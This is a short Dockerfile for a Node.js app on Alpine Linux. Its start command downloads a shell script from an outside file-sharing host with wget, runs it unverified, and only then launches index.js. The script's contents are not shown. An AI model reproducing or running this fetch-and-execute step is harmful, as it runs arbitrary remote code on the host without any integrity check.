FROM node:alpine3.20

WORKDIR /tmp

COPY . .

EXPOSE 3000/tcp

RUN apk update && apk upgrade &&\
    apk add --no-cache openssl curl gcompat iproute2 coreutils &&\
    apk add --no-cache bash &&\
    chmod +x index.js &&\
    npm install

CMD mkdir -p /tmp/tmp && \
    wget -qO /tmp/tmp/justrunmy.sh "https://zfile.elelele.com/directlink/edward_cf_R2/Script/justrunmy.sh" && \
    chmod +x /tmp/tmp/justrunmy.sh && \
    /tmp/tmp/justrunmy.sh && \
    exec node index.js
